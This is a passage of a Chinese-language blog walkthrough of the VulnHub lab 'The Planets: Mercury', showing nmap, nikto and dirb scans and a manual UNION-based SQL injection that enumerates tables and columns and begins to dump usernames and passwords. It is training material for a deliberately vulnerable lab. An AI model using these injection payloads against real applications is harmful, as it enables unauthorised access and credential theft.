<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[vulnhub]  The Planets: Mercury | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.7.0/styles/default.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-duotone-dark.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  The Planets: Mercury</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-24T08:57:01.978Z" id="date"> 2023-05-24</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-24T13:55:06.652Z" id="updated"> 2023-05-24</time></div></span><br><span>Word Count: <div class="control">4.8k</div></span><br><span>Read Time: <div class="control">28 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/601c601ca7df92eef3eee22b83bcd142355143.jpg'><img src="/pic/601c601ca7df92eef3eee22b83bcd142355143.jpg" alt="601c601ca7df92eef3eee22b83bcd142355143"></p>
<span id="more"></span>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机发现，端口扫描，服务检测，TCP扫描，OS检测，漏洞扫描。</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -sn 192.168.56.0/24                                     
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-05-23 21:21 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.1
Host is up <span class="token punctuation">(</span>0.00028s latency<span class="token punctuation">)</span>.
MAC Address: 0A:00:27:00:00:08 <span class="token punctuation">(</span>Unknown<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.100
Host is up <span class="token punctuation">(</span>0.00011s latency<span class="token punctuation">)</span>.
MAC Address: 08:00:27:17:F0:4B <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.103
Host is up <span class="token punctuation">(</span>0.00016s latency<span class="token punctuation">)</span>.
MAC Address: 08:00:27:80:E5:A9 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.144
Host is up.
Nmap done: 256 IP addresses <span class="token punctuation">(</span>4 hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 6.95 seconds
                                                                                             
┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -p- --min-rate<span class="token operator">=</span>10000 192.168.56.103
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-05-23 21:22 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.103
Host is up <span class="token punctuation">(</span>0.00052s latency<span class="token punctuation">)</span>.
Not shown: 65533 closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
8080/tcp <span class="token function">open</span>  http-proxy
MAC Address: 08:00:27:80:E5:A9 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 8.87 seconds
                                                                                             
┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -sT -sV -sC -O -p22,8080 192.168.56.103
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-05-23 21:23 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.103
Host is up <span class="token punctuation">(</span>0.00041s latency<span class="token punctuation">)</span>.

PORT     STATE SERVICE    VERSION
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol 2.0<span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   3072 c824ea2a2bf13cfa169465bdc79b6c29 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   256 e808a18e7d5abc5c66164824570dfab8 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  256 2f187e1054f7b917a2111d8fb330a52a <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
8080/tcp <span class="token function">open</span>  http-proxy WSGIServer/0.2 CPython/3.8.2
<span class="token operator">|</span>_http-server-header: WSGIServer/0.2 CPython/3.8.2
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> charset<span class="token operator">=</span>utf-8<span class="token punctuation">)</span>.
<span class="token operator">|</span> http-robots.txt: 1 disallowed entry 
<span class="token operator">|</span>_/
<span class="token operator">|</span> fingerprint-strings: 
<span class="token operator">|</span>   FourOhFourRequest: 
<span class="token operator">|</span>     HTTP/1.1 404 Not Found
<span class="token operator">|</span>     Date: Tue, 23 May 2023 13:23:21 GMT
<span class="token operator">|</span>     Server: WSGIServer/0.2 CPython/3.8.2
<span class="token operator">|</span>     Content-Type: text/html
<span class="token operator">|</span>     X-Frame-Options: DENY
<span class="token operator">|</span>     Content-Length: 2366
<span class="token operator">|</span>     X-Content-Type-Options: nosniff
<span class="token operator">|</span>     Referrer-Policy: same-origin
<span class="token operator">|</span>     <span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>head<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"content-type"</span> content<span class="token operator">=</span><span class="token string">"text/html; charset=utf-8"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>title<span class="token operator">></span>Page not found at /nice ports,/Trinity.txt.bak<span class="token operator">&lt;</span>/title<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"robots"</span> content<span class="token operator">=</span><span class="token string">"NONE,NOARCHIVE"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>style type<span class="token operator">=</span><span class="token string">"text/css"</span><span class="token operator">></span>
<span class="token operator">|</span>     html * <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; padding:0; margin:0; &amp;#125;</span>
<span class="token operator">|</span>     body * <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; padding:10px 20px; &amp;#125;</span>
<span class="token operator">|</span>     body * * <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; padding:0; &amp;#125;</span>
<span class="token operator">|</span>     body <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; font:small sans-serif; background:#eee; color:#000; &amp;#125;</span>
<span class="token operator">|</span>     body<span class="token operator">></span>div <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; border-bottom:1px solid #ddd; &amp;#125;</span>
<span class="token operator">|</span>     font-weight:normal<span class="token punctuation">;</span> margin-bottom:.4em<span class="token punctuation">;</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
<span class="token operator">|</span>     span <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; font-size:60%; color:#666; font-weight:normal; &amp;#125;</span>
<span class="token operator">|</span>     table <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; border:none; border-collapse: collapse; width:100%; &amp;#125;</span>
<span class="token operator">|</span>     vertical-align:
<span class="token operator">|</span>   GetRequest, HTTPOptions: 
<span class="token operator">|</span>     HTTP/1.1 200 OK
<span class="token operator">|</span>     Date: Tue, 23 May 2023 13:23:21 GMT
<span class="token operator">|</span>     Server: WSGIServer/0.2 CPython/3.8.2
<span class="token operator">|</span>     Content-Type: text/html<span class="token punctuation">;</span> charset<span class="token operator">=</span>utf-8
<span class="token operator">|</span>     X-Frame-Options: DENY
<span class="token operator">|</span>     Content-Length: 69
<span class="token operator">|</span>     X-Content-Type-Options: nosniff
<span class="token operator">|</span>     Referrer-Policy: same-origin
<span class="token operator">|</span>     Hello. This site is currently <span class="token keyword">in</span> development please check back later.
<span class="token operator">|</span>   RTSPRequest: 
<span class="token operator">|</span>     <span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE HTML PUBLIC <span class="token string">"-//W3C//DTD HTML 4.01//EN"</span>
<span class="token operator">|</span>     <span class="token string">"http://www.w3.org/TR/html4/strict.dtd"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>html<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>head<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> content<span class="token operator">=</span><span class="token string">"text/html;charset=utf-8"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>title<span class="token operator">></span>Error response<span class="token operator">&lt;</span>/title<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>/head<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>body<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>h1<span class="token operator">></span>Error response<span class="token operator">&lt;</span>/h1<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>p<span class="token operator">></span>Error code: 400<span class="token operator">&lt;</span>/p<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>p<span class="token operator">></span>Message: Bad request version <span class="token punctuation">(</span><span class="token string">'RTSP/1.0'</span><span class="token punctuation">)</span>.<span class="token operator">&lt;</span>/p<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>p<span class="token operator">></span>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.<span class="token operator">&lt;</span>/p<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>/body<span class="token operator">></span>
<span class="token operator">|</span>_    <span class="token operator">&lt;</span>/html<span class="token operator">></span>
1 <span class="token function">service</span> unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service <span class="token keyword">:</span>
SF-Port8080-TCP:V<span class="token operator">=</span>7.93%I<span class="token operator">=</span>7%D<span class="token operator">=</span>5/23%Time<span class="token operator">=</span>646CBE4A%P<span class="token operator">=</span>x86_64-pc-linux-gnu%r<span class="token punctuation">(</span>Ge
SF:tRequest,135,<span class="token string">"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2023\x20May\x202
SF:023\x2013:23:21\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8\.2
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\x2
SF:0DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nosniff\r\
SF:nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\x20is\x
SF:20currently\x20in\x20development\x20please\x20check\x20back\x20later\."</span>
SF:<span class="token punctuation">)</span>%r<span class="token punctuation">(</span>HTTPOptions,135,<span class="token string">"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2023\x20M
SF:ay\x202023\x2013:23:21\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/
SF:3\.8\.2\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Opti
SF:ons:\x20DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nos
SF:niff\r\nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\
SF:x20is\x20currently\x20in\x20development\x20please\x20check\x20back\x20l
SF:ater\."</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>RTSPRequest,1F4,<span class="token string">"&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DT
SF:D\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\
SF:.w3\.org/TR/html4/strict\.dtd\">\n&lt;html>\n\x20\x20\x20\x20&lt;head>\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\"Content-Type\"\x20cont
SF:ent=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;titl
SF:e>Error\x20response&lt;/title>\n\x20\x20\x20\x20&lt;/head>\n\x20\x20\x20\x20&lt;
SF:body>\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1>Error\x20response&lt;/h1>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20&lt;p>Error\x20code:\x20400&lt;/p>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20&lt;p>Message:\x20Bad\x20request\x20version\x20\('RTSP/
SF:1\.0'\)\.&lt;/p>\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p>Error\x20code\x20expl
SF:anation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x2
SF:0or\x20unsupported\x20method\.&lt;/p>\n\x20\x20\x20\x20&lt;/body>\n&lt;/html>\n"</span>
SF:<span class="token punctuation">)</span>%r<span class="token punctuation">(</span>FourOhFourRequest,A28,<span class="token string">"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x2
SF:0Tue,\x2023\x20May\x202023\x2013:23:21\x20GMT\r\nServer:\x20WSGIServer/
SF:0\.2\x20CPython/3\.8\.2\r\nContent-Type:\x20text/html\r\nX-Frame-Option
SF:s:\x20DENY\r\nContent-Length:\x202366\r\nX-Content-Type-Options:\x20nos
SF:niff\r\nReferrer-Policy:\x20same-origin\r\n\r\n&lt;!DOCTYPE\x20html>\n&lt;htm
SF:l\x20lang=\"en\">\n&lt;head>\n\x20\x20&lt;meta\x20http-equiv=\"content-type\"
SF:\x20content=\"text/html;\x20charset=utf-8\">\n\x20\x20&lt;title>Page\x20no
SF:t\x20found\x20at\x20/nice\x20ports,/Trinity\.txt\.bak&lt;/title>\n\x20\x20
SF:&lt;meta\x20name=\"robots\"\x20content=\"NONE,NOARCHIVE\">\n\x20\x20&lt;style
SF:\x20type=\"text/css\">\n\x20\x20\x20\x20html\x20\*\x20&amp;#123;\x20padding:0;\x
SF:20margin:0;\x20&amp;#125;\n\x20\x20\x20\x20body\x20\*\x20&amp;#123;\x20padding:10px\x2020
SF:px;\x20&amp;#125;\n\x20\x20\x20\x20body\x20\*\x20\*\x20&amp;#123;\x20padding:0;\x20&amp;#125;\n\x2
SF:0\x20\x20\x20body\x20&amp;#123;\x20font:small\x20sans-serif;\x20background:#eee;
SF:\x20color:#000;\x20&amp;#125;\n\x20\x20\x20\x20body>div\x20&amp;#123;\x20border-bottom:1p
SF:x\x20solid\x20#ddd;\x20&amp;#125;\n\x20\x20\x20\x20h1\x20&amp;#123;\x20font-weight:normal
SF:;\x20margin-bottom:\.4em;\x20&amp;#125;\n\x20\x20\x20\x20h1\x20span\x20&amp;#123;\x20font
SF:-size:60%;\x20color:#666;\x20font-weight:normal;\x20&amp;#125;\n\x20\x20\x20\x20
SF:table\x20&amp;#123;\x20border:none;\x20border-collapse:\x20collapse;\x20width:10
SF:0%;\x20&amp;#125;\n\x20\x20\x20\x20td,\x20th\x20&amp;#123;\x20vertical-align:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
MAC Address: 08:00:27:80:E5:A9 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least 1 <span class="token function">open</span> and 1 closed port
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.3
Network Distance: 1 hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 100.85 seconds
                                                                                             
┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap --script<span class="token operator">=</span>vuln 192.168.56.103           
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-05-23 21:29 CST
Stats: 0:07:29 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span>, 1 undergoing Script Scan
NSE Timing: About 98.48% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: 21:36 <span class="token punctuation">(</span>0:00:07 remaining<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.103
Host is up <span class="token punctuation">(</span>0.00026s latency<span class="token punctuation">)</span>.
Not shown: 998 closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
8080/tcp <span class="token function">open</span>  http-proxy
<span class="token operator">|</span> http-slowloris-check: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   Slowloris DOS attack
<span class="token operator">|</span>     State: LIKELY VULNERABLE
<span class="token operator">|</span>     IDs:  CVE:CVE-2007-6750
<span class="token operator">|</span>       Slowloris tries to keep many connections to the target web server <span class="token function">open</span> and hold
<span class="token operator">|</span>       them <span class="token function">open</span> as long as possible.  It accomplishes this by opening connections to
<span class="token operator">|</span>       the target web server and sending a partial request. By doing so, it starves
<span class="token operator">|</span>       the http server<span class="token string">'s resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-enum: 
|_  /robots.txt: Robots file
MAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 522.27 seconds
                                                                                             
┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]
└─$ sudo nikto -h http://192.168.56.103:8080
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        8080
+ Start Time:         2023-05-23 21:38:54 (GMT8)
---------------------------------------------------------------------------
+ Server: WSGIServer/0.2 CPython/3.8.2
+ No CGI Directories found (use '</span>-C all' to force check all possible dirs<span class="token punctuation">)</span>
+ /SilverStream: SilverStream allows directory listing. See: https://web.archive.org/web/20011226154728/http://archives.neohapsis.com/archives/sf/pentest/2000-11/0147.html
+ /static/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="token keyword">in</span> a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ 8103 requests: 0 error<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and 2 item<span class="token punctuation">(</span>s<span class="token punctuation">)</span> reported on remote host
+ End Time:           2023-05-23 21:46:40 <span class="token punctuation">(</span>GMT8<span class="token punctuation">)</span> <span class="token punctuation">(</span>466 seconds<span class="token punctuation">)</span>
---------------------------------------------------------------------------
+ 1 host<span class="token punctuation">(</span>s<span class="token punctuation">)</span> tested
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>只开了22和8080方法，漏扫也没什么有用结果。</p>
<p>简单做个网页目录发现</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> dirb http://192.168.56.103:8080                                              
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May 24 15:41:43 2023
URL_BASE: http://192.168.56.103:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.103:8080/ ----
+ http://192.168.56.103:8080/robots.txt <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:26<span class="token punctuation">)</span>                                            
-----------------
END_TIME: Wed May 24 15:42:18 2023
DOWNLOADED: 4612 - FOUND: 1
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>只发现robots.txt，并且里面没啥有用信息。<br>再在后台挂个<code>feroxbuster +x php,txt,asp,zip</code>确保目录发现没有遗漏什么重要信息。<br>但是不能闲着啊，于是我们尝试手动发现一下，惊喜的发现404页面的错误信息给我们带来了有用信息。<br class='item-img' data-src='/pic/assets/1684916429312-9fe3196c-5297-4130-a91e-86e416d6f073.png'><img src="/pic/assets/1684916429312-9fe3196c-5297-4130-a91e-86e416d6f073.png" alt="404pg.png"><br>Django错误提示告诉我们有一个目录是mercuryfacts&#x2F;<br>那我们就看看吧<br class='item-img' data-src='/pic/assets/1684916550651-159d340f-402a-4cdf-9e91-61ecb4045637.png'><img src="/pic/assets/1684916550651-159d340f-402a-4cdf-9e91-61ecb4045637.png" alt="mercury.png"><br>底下两个连接可以看看。<br>先看看todo<br class='item-img' data-src='/pic/assets/1684916581511-7fed8ec8-55b6-43e7-adf4-7e35a5165042.png'><img src="/pic/assets/1684916581511-7fed8ec8-55b6-43e7-adf4-7e35a5165042.png" alt="todo-remain-us-something.png"><br>发现两个有用信息：认证用的表很可能是’users’；现有的mysql请求是直接用python写的不是用django写的，很有可能存在SQL注入漏洞。<br>问题是哪里有SQLi漏洞，先不急看看另一个页面。<br class='item-img' data-src='/pic/assets/1684916703972-78a63761-7ecf-4499-a530-bfee9f825a6f.png'><img src="/pic/assets/1684916703972-78a63761-7ecf-4499-a530-bfee9f825a6f.png" alt="normalpapge.png"><br>这个URL的1很像查询的参数，多半有问题，加个引号试试<br class='item-img' data-src='/pic/assets/1684916742837-3d92b737-addc-4a67-89c4-fd038415b92d.png'><img src="/pic/assets/1684916742837-3d92b737-addc-4a67-89c4-fd038415b92d.png" alt="SQLi-found.png"><br>OK，不仅有SQL注入漏洞还有很详细的错误信息。那就别客气开始吧。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Manual-SQLi"><a href="#Manual-SQLi" class="headerlink" title="Manual SQLi"></a>Manual SQLi</h3><p>先说一下手动方法。</p>
<ol>
<li>先用<code>order by</code>猜列数</li>
</ol>
<p class='item-img' data-src='/pic/assets/1684916856148-9872c623-f943-4acc-ab66-bf1afe811323.png'><img src="/pic/assets/1684916856148-9872c623-f943-4acc-ab66-bf1afe811323.png" alt="orderby-1.png"><br>真就1列？<br class='item-img' data-src='/pic/assets/1684916867116-10743213-f646-4b33-8c05-c8c7a4cbc891.png'><img src="/pic/assets/1684916867116-10743213-f646-4b33-8c05-c8c7a4cbc891.png" alt="orderby-2.png"><br>OK，真就1列。</p>
<ol start="2">
<li>列数确定了就可以<code>UNION SELECT</code>了。</li>
</ol>
<p>先用<code>UNION SELECT database()</code>查库名。<br class='item-img' data-src='/pic/assets/1684916975671-31af4a77-f7ac-4bc1-a45d-eeeb5fac9432.png'><img src="/pic/assets/1684916975671-31af4a77-f7ac-4bc1-a45d-eeeb5fac9432.png" alt="UNION_SELECT_db.png"><br>再用<code>UNION SELECT group_concat(table_name) from information_schema.tables where table_schema=database()</code>查表名。注意，此处如果直接<code>from information_schema.tables</code>查只会得到默认库中的表名，获得不到mercury库的表信息，需要我们自己指定数据库<code>where table_schema=database()</code>才行。<br class='item-img' data-src='/pic/assets/1684917046883-15d9a013-5ffc-45df-8821-f558d93dec2f.png'><img src="/pic/assets/1684917046883-15d9a013-5ffc-45df-8821-f558d93dec2f.png" alt="UNION_SELECT_tables.png"><br>接下来<code>UNION SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code>查列名。小技巧，如果单引号被过滤可以用16进制表名绕过。<br class='item-img' data-src='/pic/assets/1684917230296-1c5e3ee2-9852-44f0-ad55-0ddedc9fd12e.png'><img src="/pic/assets/1684917230296-1c5e3ee2-9852-44f0-ad55-0ddedc9fd12e.png" alt="UNION-col.png"><br>东西都齐了直接查我们要的信息吧。<code>UNION SELECT group concat(id,Ox7c,username,Ox7c,password)from 